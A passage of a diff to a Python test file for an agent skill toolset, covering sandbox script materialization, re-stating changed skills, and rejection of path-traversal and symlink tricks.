+  """
+  env = _SandboxPerSessionEnvironment()
+  env.failing_writes.add(f"{_SKILL_DIR}/scripts/s.py")
+  toolset = skill_toolset.SkillToolset(
+      [_real_skill(scripts={"s.py": "print('v1')"})], environment=env
+  )
+  ctx = _session()
+
+  first = await _run_script(toolset, ctx)
+  files_after_first = dict(env.sandboxes["shared"])
+  second = await _run_script(toolset, ctx)
+
+  assert first["error_code"] == "EXECUTION_ERROR"
+  assert _HASH_MARKER not in files_after_first
+  assert second["stdout"] == "print('v1')"
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("initialized", [True, False])
+async def test_restating_a_changed_skill_leaves_the_environment_alone(
+    initialized,
+):
+  """A request re-states a changed skill and calls no environment method.
+
+  The next script run refreshes the copy in the environment instead. A
+  session-scoped environment may not have a sandbox for this session yet.
+  """
+  env = _SandboxPerSessionEnvironment()
+  env.is_initialized = initialized
+  toolset = _revalidating_toolset(
+      _real_skill(instructions="v1", scripts={"s.py": "print('v1')"}),
+      environment=env,
+  )
+  ctx = _session()
+  await _load(skill_toolset.LoadSkillTool(toolset), ctx, "a")
+  toolset._skills["a"] = _real_skill(
+      instructions="v2", scripts={"s.py": "print('v2')"}
+  )
+  env.calls.clear()
+
+  instructions = await _instructions_for(toolset, ctx)
+
+  (restated,) = [
+      i for i in instructions if "has changed since it was loaded" in i
+  ]
+  assert "v2" in restated
+  assert env.calls == []
+
+
 @pytest.mark.asyncio
 async def test_script_path_with_scripts_prefix_dot_and_dot_slash(tmp_path):
   """Script paths 'scripts/.' and 'scripts/' must raise PermissionError."""
@@ -7002,17 +7566,16 @@ async def test_script_path_with_scripts_prefix_dot_and_dot_slash(tmp_path):
   for bad_script_path in ("scripts/.", "scripts/"):
     with pytest.raises(PermissionError, match="Path traversal detected"):
       await tool._ensure_skill_materialized_in_env(
-          skill, bad_script_path, mock_env
+          skill, bad_script_path, mock_env, mock.sentinel.tool_context
       )
   mock_env.read_file.assert_not_called()
 
-  await tool._ensure_skill_materialized_in_env(
-      skill, "./scripts/run.py", mock_env
+  script_path = await tool._ensure_skill_materialized_in_env(
+      skill, "./scripts/run.py", mock_env, mock.sentinel.tool_context
   )
-  expected_probe = PurePosixPath(
+  assert script_path == PurePosixPath(
       (tmp_path / "skills" / "safe-skill" / "scripts" / "run.py").as_posix()
   )
-  mock_env.read_file.assert_called_once_with(expected_probe)
 
 
 @pytest.mark.asyncio
@@ -7038,12 +7601,15 @@ async def test_write_skill_resources_to_env_rejects_cross_subdir_symlink(
       ),
   )
   mock_env = mock.AsyncMock()
-  mock_env.is_initialized = True
+  mock_env.read_file.side_effect = FileNotFoundError()
   toolset = skill_toolset.SkillToolset(
       [skill], environment=mock_env, skills_folder=tmp_path / "skills"
   )
+  tool = skill_toolset.RunSkillScriptTool(toolset)
   with pytest.raises(PermissionError, match="Path traversal detected"):
-    await toolset._rematerialize_skill(skill)
+    await tool._ensure_skill_materialized_in_env(
+        skill, "run.py", mock_env, mock.sentinel.tool_context
+    )
   mock_env.write_file.assert_not_called()
 
 
@@ -7090,7 +7656,9 @@ async def test_write_skill_resources_to_env_rejects_duplicate_normalized_path(
   )
   tool = skill_toolset.RunSkillScriptTool(toolset)
   with pytest.raises(ValueError, match="Duplicate normalized path"):
-    await tool._ensure_skill_materialized_in_env(skill, "run.py", mock_env)
+    await tool._ensure_skill_materialized_in_env(
+        skill, "run.py", mock_env, mock.sentinel.tool_context
+    )
   mock_env.write_file.assert_not_called()
 
   executor = skill_toolset._SkillScriptCodeExecutor(
